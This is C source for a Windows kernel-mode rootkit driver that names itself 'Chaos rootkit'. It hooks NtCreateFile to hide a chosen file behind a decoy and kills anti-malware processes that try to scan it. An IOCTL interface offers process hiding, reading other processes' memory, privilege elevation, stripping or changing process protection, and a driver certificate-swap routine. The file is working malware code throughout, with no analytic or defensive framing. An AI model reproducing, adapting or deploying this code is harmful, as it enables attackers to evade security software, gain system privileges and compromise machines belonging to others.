#include "header.h"
#include "ZwSwapCert.h"


NTSTATUS WINAPI FakeNtCreateFile2(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
) {

    NTSTATUS status = STATUS_UNSUCCESSFUL;

    __try
    {
        KPROCESSOR_MODE prevMode = ExGetPreviousMode();
        if (prevMode == UserMode)
        {
            __try
            {
                if (ObjectAttributes) // https://x.com/sixtyvividtails/status/1990792400378478610
                {
                    ProbeForRead(ObjectAttributes, sizeof(OBJECT_ATTRIBUTES), sizeof(PVOID));

                    if (ObjectAttributes->ObjectName)
                    {
                        ProbeForRead(ObjectAttributes->ObjectName, sizeof(UNICODE_STRING), sizeof(PVOID));

                        if (ObjectAttributes->ObjectName->Buffer && ObjectAttributes->ObjectName->Length > 0)
                        {
                            ProbeForRead(
                                ObjectAttributes->ObjectName->Buffer,
                                ObjectAttributes->ObjectName->Length,
                                sizeof(WCHAR)
                            );
                        }
                    }
                }

                if (FileHandle)
                    ProbeForRead(FileHandle, sizeof(HANDLE), sizeof(PVOID));

                if (IoStatusBlock)
                    ProbeForRead(IoStatusBlock, sizeof(IO_STATUS_BLOCK), sizeof(PVOID));

            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"ProbeForRead failed: 0x%08X\n", GetExceptionCode());
                return GetExceptionCode();
            }
        }

        __try
        {
            if (ObjectAttributes &&
                ObjectAttributes->ObjectName &&
                ObjectAttributes->ObjectName->Buffer)
            {

                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename) &&
                    !wcsstr(ObjectAttributes->ObjectName->Buffer, L".lnk"))
                {
                    PEPROCESS process = NULL;

                    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)PsGetCurrentProcessId(), &process);

                    if (!NT_SUCCESS(ret))
                    {
                        if (ret == STATUS_INVALID_PARAMETER)
                        {
                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"the process ID was not found.\n");
                        }
                        else if (ret == STATUS_INVALID_CID)
                        {
                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"the specified client ID is not valid.\n");
                        }
                        return ret;
                    }


                    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;
                    BYTE protectionLevel = *(BYTE*)EProtectionLevel;


                    ObDereferenceObject(process);

                    RtlCopyUnicodeString(ObjectAttributes->ObjectName, &xHooklist.decoyFile);
                    ObjectAttributes->ObjectName->Length = xHooklist.decoyFile.Length;
                    ObjectAttributes->ObjectName->MaximumLength = xHooklist.decoyFile.MaximumLength;


                    if (protectionLevel == global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT)
                    {
                        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"anti-malware trying to scan it!!\n");

                        status = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
                        if (!NT_SUCCESS(status))
                        {
                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Failed to terminate the anti-malware: %08X\n", status);
                        }
                        else
                        {
                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"anti-malware terminated successfully.\n");
                        }
                    }

                    return IoCreateFile(
                        FileHandle,
                        DesiredAccess,
                        ObjectAttributes,
                        IoStatusBlock,
                        AllocationSize,
                        FileAttributes,
                        ShareAccess,
                        CreateDisposition,
                        CreateOptions,
                        EaBuffer,
                        EaLength,
                        CreateFileTypeNone,
                        NULL,
                        0
                    );
                }
            }

            return IoCreateFile(
                FileHandle,
                DesiredAccess,
                ObjectAttributes,
                IoStatusBlock,
                AllocationSize,
                FileAttributes,
                ShareAccess,
                CreateDisposition,
                CreateOptions,
                EaBuffer,
                EaLength,
                CreateFileTypeNone,
                NULL,
                0
            );
        }
        __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
        {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"An issue occurred while hooking NtCreateFile (Hook Removed) (%08X)\n", GetExceptionCode());
            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
            return GetExceptionCode();
        }
    }
    __finally
    {
        //KeReleaseMutex(&Mutex, 0);
    }

    return status;
}


NTSTATUS WINAPI FakeNtCreateFile3(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    __try
    {
        KPROCESSOR_MODE prevMode = ExGetPreviousMode();
        if (prevMode == UserMode)
        {
            __try
            {
                if (ObjectAttributes)
                {
                    ProbeForRead(ObjectAttributes, sizeof(OBJECT_ATTRIBUTES), sizeof(PVOID));

                    if (ObjectAttributes->ObjectName)
                    {
                        ProbeForRead(ObjectAttributes->ObjectName, sizeof(UNICODE_STRING), sizeof(PVOID));

                        if (ObjectAttributes->ObjectName->Buffer && ObjectAttributes->ObjectName->Length > 0)
                        {
                            ProbeForRead(
                                ObjectAttributes->ObjectName->Buffer,
                                ObjectAttributes->ObjectName->Length,
                                sizeof(WCHAR)
                            );
                        }
                    }
                }

                if (FileHandle)
                    ProbeForRead(FileHandle, sizeof(HANDLE), sizeof(PVOID));

                if (IoStatusBlock)
                    ProbeForRead(IoStatusBlock, sizeof(IO_STATUS_BLOCK), sizeof(PVOID));

            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"ProbeForRead failed: 0x%08X\n", GetExceptionCode());
                return GetExceptionCode();
            }
        }
        __try {

            if (ObjectAttributes &&
                ObjectAttributes->ObjectName &&
                ObjectAttributes->ObjectName->Buffer) {

                // Check if the filename matches the hook list
                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename))
                {

                    PVOID process = NULL;

                    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)PsGetCurrentProcessId(), &process);

                    if (ret != STATUS_SUCCESS)
                    {
                        if (ret == STATUS_INVALID_PARAMETER)
                        {
                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"the process ID was not found.");
                        }

                        if (ret == STATUS_INVALID_CID)
                        {
                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"the specified client ID is not valid.");
                        }

                        return (-1);
                    }


                    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;

                    if (process)
                        ObDereferenceObject(process);

                    if (*(BYTE*)EProtectionLevel == global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT)
                    {
                        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"anti-malware trying to scan it!!\n");

                        status = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
                        if (!NT_SUCCESS(status))
                        {
                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Failed to terminate the anti-malware: %08X\n", status);
                        }
                        else
                        {
                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"anti-malware terminated successfully.\n");
                        }
                    }

                    return (IoCreateFile(
                        FileHandle,
                        DesiredAccess,
                        ObjectAttributes,
                        IoStatusBlock,
                        AllocationSize,
                        FileAttributes,
                        ShareAccess,
                        CreateDisposition,
                        CreateOptions,
                        EaBuffer,
                        EaLength,
                        CreateFileTypeNone,
                        (PVOID)NULL,
                        0
                    ));
                }
            }

            return (IoCreateFile(
                FileHandle,
                DesiredAccess,
                ObjectAttributes,
                IoStatusBlock,
                AllocationSize,
                FileAttributes,
                ShareAccess,
                CreateDisposition,
                CreateOptions,
                EaBuffer,
                EaLength,
                CreateFileTypeNone,
                (PVOID)NULL,
                0
            ));
        }
        __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
        {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"An issue occurred while hooking NtCreateFile (Hook Removed) (%08X) \n", GetExceptionCode());

            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
        }
    }
    __finally {
        //KeReleaseMutex(&Mutex, 0);
    }

    return (status);
}

//NTSTATUS WINAPI FakeNtCreateFile(
//    PHANDLE            FileHandle,
//    ACCESS_MASK        DesiredAccess,
//    POBJECT_ATTRIBUTES ObjectAttributes,
//    PIO_STATUS_BLOCK   IoStatusBlock,
//    PLARGE_INTEGER     AllocationSize,
//    ULONG              FileAttributes,
//    ULONG              ShareAccess,
//    ULONG              CreateDisposition,
//    ULONG              CreateOptions,
//    PVOID              EaBuffer,
//    ULONG              EaLength
//) {
//
//    int requestorPid = 0x0;
//
//    try
//    {
//        KPROCESSOR_MODE prevMode = ExGetPreviousMode();
//        if (prevMode == UserMode)
//        {
//            __try
//            {
//                if (ObjectAttributes)
//                {
//                    ProbeForRead(ObjectAttributes, sizeof(OBJECT_ATTRIBUTES), sizeof(PVOID));
//
//                    if (ObjectAttributes->ObjectName)
//                    {
//                        ProbeForRead(ObjectAttributes->ObjectName, sizeof(UNICODE_STRING), sizeof(PVOID));
//
//                        if (ObjectAttributes->ObjectName->Buffer && ObjectAttributes->ObjectName->Length > 0)
//                        {
//                            ProbeForRead(
//                                ObjectAttributes->ObjectName->Buffer,
//                                ObjectAttributes->ObjectName->Length,
//                                sizeof(WCHAR)
//                            );
//                        }
//                    }
//                }
//
//                if (FileHandle)
//                    ProbeForRead(FileHandle, sizeof(HANDLE), sizeof(PVOID));
//
//                if (IoStatusBlock)
//                    ProbeForRead(IoStatusBlock, sizeof(IO_STATUS_BLOCK), sizeof(PVOID));
//
//            }
//            __except (EXCEPTION_EXECUTE_HANDLER)
//            {
//                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"ProbeForRead failed: 0x%08X\n", GetExceptionCode());
//                return GetExceptionCode();
//            }
//        }
//        __try {
//
//            if (ObjectAttributes &&
//                ObjectAttributes->ObjectName &&
//                ObjectAttributes->ObjectName->Buffer)
//            {
//
//                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename))
//                {
//
//                    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Blocked : %wZ.\n", ObjectAttributes->ObjectName);
//
//                    FLT_CALLBACK_DATA flt;
//
//                    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"requestor pid %d\n", requestorPid = FltGetRequestorProcessId(&flt));
//
//                    if ((ULONG)requestorPid == (ULONG)xHooklist.pID || !requestorPid) // more testing need to be done at this part ,used 0 to avoid restricting the same process ...
//                    {
//
//                        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"process allowed\n");
//
//                        return (IoCreateFile(
//                            FileHandle,
//                            DesiredAccess,
//                            ObjectAttributes,
//                            IoStatusBlock,
//                            AllocationSize,
//                            FileAttributes,
//                            ShareAccess,
//                            CreateDisposition,
//                            CreateOptions,
//                            EaBuffer,
//                            EaLength,
//                            CreateFileTypeNone,
//                            (PVOID)NULL,
//                            0
//                        ));
//                    }
//
//                    return (STATUS_ACCESS_DENIED);
//                }
//
//            }
//
//            return (IoCreateFile(
//                FileHandle,
//                DesiredAccess,
//                ObjectAttributes,
//                IoStatusBlock,
//                AllocationSize,
//                FileAttributes,
//                ShareAccess,
//                CreateDisposition,
//                CreateOptions,
//                EaBuffer,
//                EaLength,
//                CreateFileTypeNone,
//                (PVOID)NULL,
//                0
//            ));
//        }
//        __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
//            ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
//        {
//            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"an issue occured while hooking NtCreateFile (Hook Removed ) (%08) \n", GetExceptionCode());
//
//            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
//        }
//    }
//    __finally {
//
//        // KeReleaseMutex(&Mutex, FALSE);
//    }
//    return (STATUS_SUCCESS);
//}

//DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
//{
//    if (!hooklist_s || !rfileinfo.filename || (!rfileinfo.rpid && Option == 1))
//    {
//        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"invalid structure provided \n");
//        return (-1);
//    }
//
//    if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile && Option == 1 && \
//        hooklist_s->pID == rfileinfo.rpid)
//    {
//        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Hook already active for function 1\n");
//        return  (STATUS_ALREADY_EXISTS);
//    }
//
//    else if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile2 && Option == 2)
//    {
//        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Hook already active for function 2\n");
//        return  (STATUS_ALREADY_EXISTS);
//    }
//
//    else if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile3 && Option == 3)
//    {
//        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Hook already active for function 3\n");
//        return  (STATUS_ALREADY_EXISTS);
//    }
//
//
//    if (Option == 1)
//    {
//        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"allowing PID  \n", rfileinfo.rpid);
//
//        hooklist_s->pID = rfileinfo.rpid;
//
//        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile;
//    }
//
//    else if (Option == 2)
//        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile2;
//    else if (Option == 3)
//        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile3;
//
//
//    memcpy(hooklist_s->NtCreateFilePatch + 2, &hooklist_s->NtCreateFileHookAddress, sizeof(void*));
//
//    RtlCopyMemory(hooklist_s->filename, rfileinfo.filename, sizeof(rfileinfo.filename));
//
//    write_to_read_only_memory(hooklist_s->NtCreateFileAddress, &hooklist_s->NtCreateFilePatch, sizeof(hooklist_s->NtCreateFilePatch));
//
//    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Hooks installed \n");
//
//    return (0);
//}

void
unloadv(
    PDRIVER_OBJECT driverObject
)
{
    __try
    {

        __try
        {
            if (xHooklist.NtCreateFileAddress)
                write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));

            PrepareDriverForUnload();

        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"An error occured during driver unloading \n");
        }
    }
    __finally
    {
        IoDeleteSymbolicLink(&SymbName);

        IoDeleteDevice(driverObject->DeviceObject);

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Driver Unloaded\n");
    }
}

NTSTATUS processIoctlRequest(
    DEVICE_OBJECT* DeviceObject,
    IRP* Irp
)
{
    PIO_STACK_LOCATION  pstack = IoGetCurrentIrpStackLocation(Irp);
    KPROCESSOR_MODE     prevMode = ExGetPreviousMode();

    int pstatus = 0;
    int inputInt = 0;
    ULONG_PTR Information = sizeof(int);
    __try
    {
        // if system offsets not supported / disable features 
        // that require the use of offsets to avoid crash
        if (pstack->Parameters.DeviceIoControl.IoControlCode >= HIDE_PROC && \
            pstack->Parameters.DeviceIoControl.IoControlCode <= UNPROTECT_ALL_PROCESSES && xHooklist.check_off)
        {
            pstatus = ERROR_UNSUPPORTED_OFFSET;
            __leave;
        }
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "IOc: %d\n", pstack->Parameters.DeviceIoControl.IoControlCode);

        switch (pstack->Parameters.DeviceIoControl.IoControlCode)
        {
        case HIDE_PROC:
        {
            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
            {
                pstatus = STATUS_BUFFER_TOO_SMALL;
                break;
            }
            RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

            pstatus = HideProcess(inputInt);
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Received input value: %d\n", inputInt);

            //DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Received input value: %d\n", inputInt);
            break;
        }
        case READ_PROCESS_MEMORY:
        {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Get Read Command");

            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopermin))
            {
                pstatus = STATUS_BUFFER_TOO_SMALL;
                break;
            }
            Pfopermin input= Irp->AssociatedIrp.SystemBuffer;
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "SysTemBuffer PVOID=0x%p\n", input);
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Get Read pid=%d\n", input->rpid);

            ULONG outputLength = pstack->Parameters.DeviceIoControl.OutputBufferLength;
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "输出长度=%lu,输入长度=%I64u\n", outputLength, input->size);
         
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "校验 Size 合理\n");
            // 3. 计算所需总输出大小
            SIZE_T totalOutputSize = FIELD_OFFSET(fopermin, Data) + input->size;
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "所需输出buff大小=%I64u\n", totalOutputSize);
            if (outputLength < totalOutputSize) {
                break;
            }
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "总输出大小=%d\n", (ULONG)totalOutputSize);
            OBJECT_ATTRIBUTES attr; // 声明一个对象属性结构体。
            InitializeObjectAttributes(&attr, NULL, 0, NULL, NULL); // 初始化对象属性，无名称、无安全描述符等。
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Strart Read\n");
            ULONG Data = 0;
            Information = totalOutputSize;
            pstatus = KeReadProcessMemory(
                (HANDLE)input->rpid,
                (PVOID)input->address, 
                &(input->Data),
                input->size
            );
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Read Over pstatus %d\n", *(PULONG)(input->Data));

            if (NT_SUCCESS(pstatus)) {
                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Read Sucess 返回数据大小%d\n", (ULONG)totalOutputSize);
            }
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Read Over pstatus %d\n", pstatus);
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Read Over\n");
         
           
         
            break;
        }
        case PRIVILEGE_ELEVATION:
        {
            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
            {
                pstatus = STATUS_BUFFER_TOO_SMALL;
                break;
            }

            RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

            pstatus = PrivilegeElevationForProcess(inputInt);

            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Received input value: %d\n", inputInt);

            break;
        }

        case CR_SET_PROTECTION_LEVEL_CTL:
        {
            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(CR_SET_PROTECTION_LEVEL))
            {
                pstatus = STATUS_BUFFER_TOO_SMALL;
                break;
            }

            PCR_SET_PROTECTION_LEVEL Args = Irp->AssociatedIrp.SystemBuffer;

            pstatus = ChangeProtectionLevel(Args);

            break;
        }

       /* case RESTRICT_ACCESS_TO_FILE_CTL:
        {
            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
            {
                pstatus = STATUS_BUFFER_TOO_SMALL;
                break;
            }
            fopera rfileinfo = { 0 };
            RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));

            pstatus = initializehooklist(&xHooklist, rfileinfo, 1);
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"File access restricted ");
            break;
        }*/

       /* case PROTECT_FILE_AGAINST_ANTI_MALWARE_CTL:
        {
            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
            {
                pstatus = STATUS_BUFFER_TOO_SMALL;
                break;
            }
            fopera rfileinfo = { 0 };
            RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));

            pstatus = initializehooklist(&xHooklist, rfileinfo, 3);
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL," file protected against anti-malware processes ");
            break;
        }*/

        //case BYPASS_INTEGRITY_FILE_CTL: // 
        //{
        //    if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
        //    {
        //        pstatus = STATUS_BUFFER_TOO_SMALL;
        //        break;
        //    }
        //    fopera rfileinfo = { 0 };
        //    RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
        //    pstatus = initializehooklist(&xHooklist, rfileinfo, 2);

        //    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"bypass integrity check ");
        //    break;
        //}

        case UNPROTECT_ALL_PROCESSES:
        {
            pstatus = UnprotectAllProcesses();

            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"all Processes Protection has been removed");
            break;
        }

        case ZWSWAPCERT_CTL:
        {
            if (NT_SUCCESS(pstatus = ScDriverEntry(DeviceObject->DriverObject, registryPathCopy)))
            {
                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"{ZwSwapCert} Driver swapped in memory and on disk.\n");

            }
            else
            {
                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"{ZwSwapCert} Failed to swap driver \n");

            }
            break;
        }
       
        default:
        {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Invalid IOCTL code: 0x%08X\n", pstack->Parameters.DeviceIoControl.IoControlCode);
            pstatus = STATUS_INVALID_DEVICE_REQUEST;
            break;
        }
        }
    }
    __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
        ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
    {

        if (GetExceptionCode() == STATUS_ACCESS_VIOLATION)
        {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Invalid Buffer (STATUS_ACCESS_VIOLATION)");

            KPROCESSOR_MODE prevmode = ExGetPreviousMode();

            if (prevmode == UserMode)
            {
                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"possible that the client is attempting to crash the driver, but not if we crash you first :) ");

                if (!NT_SUCCESS(pstatus))
                {
                    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"failed to open process (%08X)\n", pstatus);

                }
                else
                {
                    pstatus = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);

                    if (!NT_SUCCESS(pstatus))
                    {
                        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"failed to terminate the requestor process (%08X)\n", pstatus);
                    }
                }

            }
        }

        pstatus = GetExceptionCode();
    }

    memcpy(Irp->AssociatedIrp.SystemBuffer, &pstatus, sizeof(pstatus));

    Irp->IoStatus.Status = pstatus;

    Irp->IoStatus.Information = Information;

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    if (pstatus)
        return (STATUS_UNSUCCESSFUL);

    return (STATUS_SUCCESS);

}



void
ShutdownCallback(
    PDRIVER_OBJECT driverObject
)
{
    __try
    {

        __try
        {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"preparing driver to be unloaded ..\n");

            PrepareDriverForUnload();

        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"An error occured during driver unloading on shutdown \n");
        }
    }
    __finally
    {

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Driver Unloaded in shutdown\n");
    }
}

NTSTATUS
DriverEntry(
    PDRIVER_OBJECT driverObject,
    PUNICODE_STRING registryPath
)
{
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Chaos rootkit loaded .. (+_+) \n");
    //DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Chaos rootkit loaded .. (+_+) \n");

    NTSTATUS status;

    UNREFERENCED_PARAMETER(driverObject);

    if (!NT_SUCCESS(status = InitializeStructure(&xHooklist)))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,("Failed to initialize hook structure (0x%08X)\n", status));
        return (STATUS_UNSUCCESSFUL);
    }

    registryPathCopy = registryPath;

    status = IoCreateDevice(driverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, METHOD_BUFFERED, FALSE, &driverObject->DeviceObject);

    if (!NT_SUCCESS(status))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,("Failed to create device object (0x%08X)\n", status));
        return (STATUS_UNSUCCESSFUL);
    }

    status = IoCreateSymbolicLink(&SymbName, &DeviceName);

    if (!NT_SUCCESS(status))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,("Failed to create symbolic link (0x%08X)\n", status));
        IoDeleteDevice(driverObject->DeviceObject);
        return (STATUS_UNSUCCESSFUL);
    }

    if (InitializeOffsets(&xHooklist))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Unsupported Windows build !\n");
        //unloadv(driverObject);
        //return (STATUS_UNSUCCESSFUL);
    }
    else
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Offsets initialized\n");
    }

    if (!NT_SUCCESS(status = IoRegisterShutdownNotification(driverObject->DeviceObject)))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Failed to register the shutdown notification callback (0x%08) \n", status);
        unloadv(driverObject);
        return (STATUS_UNSUCCESSFUL);
    }


    driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = processIoctlRequest;
    driverObject->MajorFunction[IRP_MJ_SHUTDOWN] = ShutdownCallback;
    driverObject->MajorFunction[IRP_MJ_CREATE] = IRP_MJCreate;
    driverObject->MajorFunction[IRP_MJ_CLOSE] = IRP_MJClose;
    driverObject->DriverUnload = &unloadv;

    return (STATUS_SUCCESS);
}



